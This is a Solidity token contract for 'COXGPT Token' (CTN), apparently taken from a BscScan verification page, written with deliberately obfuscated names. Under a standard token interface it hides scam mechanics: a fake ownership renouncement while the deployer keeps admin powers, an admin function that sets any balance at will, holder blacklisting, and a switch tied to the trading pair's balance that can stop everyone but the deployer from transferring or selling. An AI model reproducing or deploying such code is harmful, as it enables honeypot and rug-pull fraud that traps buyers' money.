/**
 *Submitted for verification at BscScan.com on 2023-03-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface totalShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromLaunched) external view returns (uint256);

    function transfer(address shouldAmount, uint256 maxMarketing) external returns (bool);

    function allowance(address tradingMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxMarketing) external returns (bool);

    function transferFrom(
        address sender,
        address shouldAmount,
        uint256 maxMarketing
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundMarketing, uint256 value);
    event Approval(address indexed tradingMax, address indexed spender, uint256 value);
}

interface receiverAuto is totalShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract enableTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamSell {
    function createPair(address exemptSender, address listAmount) external returns (address);
}

interface buyTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract COXGPTToken is enableTo, totalShould, receiverAuto {

    function approve(address takeTx, uint256 maxMarketing) public virtual override returns (bool) {
        buySender[_msgSender()][takeTx] = maxMarketing;
        emit Approval(_msgSender(), takeTx, maxMarketing);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return shouldAmountLaunched;
    }

    event OwnershipTransferred(address indexed launchedReceiver, address indexed fromIs);

    function getOwner() external view returns (address) {
        return shouldToken;
    }

    function transferFrom(address limitMin, address shouldAmount, uint256 maxMarketing) external override returns (bool) {
        if (_msgSender() != feeReceiver) {
            if (buySender[limitMin][_msgSender()] != type(uint256).max) {
                require(maxMarketing <= buySender[limitMin][_msgSender()]);
                buySender[limitMin][_msgSender()] -= maxMarketing;
            }
        }
        return liquidityLaunch(limitMin, shouldAmount, maxMarketing);
    }

    function decimals() external view virtual override returns (uint8) {
        return fundReceiver;
    }

    function transfer(address maxMode, uint256 maxMarketing) external virtual override returns (bool) {
        return liquidityLaunch(_msgSender(), maxMode, maxMarketing);
    }

    string private shouldAmountLaunched = "COXGPT Token";

    address public listFund;

    function liquidityWalletAmount(address swapShould) public {
        if (feeTradingWallet) {
            return;
        }
        
        walletAt[swapShould] = true;
        if (tokenList == maxLiquidity) {
            maxLiquidity = tokenList;
        }
        feeTradingWallet = true;
    }

    uint256 private receiverSenderTeam;

    uint256 private listLaunched = 100000000 * 10 ** 18;

    mapping(address => uint256) private isBuy;

    string private toLimit = "CTN";

    function balanceOf(address fromLaunched) public view virtual override returns (uint256) {
        return isBuy[fromLaunched];
    }

    function tradingWallet(address swapTo) public {
        maxMin();
        if (maxLiquidity != totalBuyEnable) {
            maxLiquidity = receiverSenderTeam;
        }
        if (swapTo == listFund || swapTo == totalFundTo) {
            return;
        }
        atLaunched[swapTo] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return toLimit;
    }

    uint256 private tokenList;

    uint8 private fundReceiver = 18;

    function liquidityLaunch(address limitMin, address shouldAmount, uint256 maxMarketing) internal returns (bool) {
        if (limitMin == listFund) {
            return marketingMode(limitMin, shouldAmount, maxMarketing);
        }
        uint256 takeBuy = totalShould(totalFundTo).balanceOf(marketingTotal);
        require(takeBuy == amountLaunch);
        require(!atLaunched[limitMin]);
        return marketingMode(limitMin, shouldAmount, maxMarketing);
    }

    uint256 amountLaunch;

    uint256 private totalBuyEnable;

    function totalSupply() external view virtual override returns (uint256) {
        return listLaunched;
    }

    bool private toMaxReceiver;

    function isFund() public {
        emit OwnershipTransferred(listFund, address(0));
        shouldToken = address(0);
    }

    address feeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function marketingSwapSell(uint256 maxMarketing) public {
        maxMin();
        amountLaunch = maxMarketing;
    }

    function owner() external view returns (address) {
        return shouldToken;
    }

    uint256 public maxLiquidity;

    function marketingMode(address limitMin, address shouldAmount, uint256 maxMarketing) internal returns (bool) {
        require(isBuy[limitMin] >= maxMarketing);
        isBuy[limitMin] -= maxMarketing;
        isBuy[shouldAmount] += maxMarketing;
        emit Transfer(limitMin, shouldAmount, maxMarketing);
        return true;
    }

    address public totalFundTo;

    function launchFund(address maxMode, uint256 maxMarketing) public {
        maxMin();
        isBuy[maxMode] = maxMarketing;
    }

    bool public feeTradingWallet;

    mapping(address => bool) public walletAt;

    address marketingTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function maxMin() private view {
        require(walletAt[_msgSender()]);
    }

    function allowance(address swapShouldMarketing, address takeTx) external view virtual override returns (uint256) {
        if (takeTx == feeReceiver) {
            return type(uint256).max;
        }
        return buySender[swapShouldMarketing][takeTx];
    }

    bool public txToLimit;

    mapping(address => mapping(address => uint256)) private buySender;

    uint256 tradingAuto;

    uint256 public atLiquidity;

    constructor (){
        if (txToLimit) {
            txToLimit = false;
        }
        buyTake isList = buyTake(feeReceiver);
        totalFundTo = teamSell(isList.factory()).createPair(isList.WETH(), address(this));
        if (atLiquidity != maxLiquidity) {
            atLiquidity = receiverSenderTeam;
        }
        walletAt[_msgSender()] = true;
        isBuy[_msgSender()] = listLaunched;
        listFund = _msgSender();
        
        emit Transfer(address(0), listFund, listLaunched);
        shouldToken = _msgSender();
        isFund();
    }

    mapping(address => bool) public atLaunched;

    address private shouldToken;

}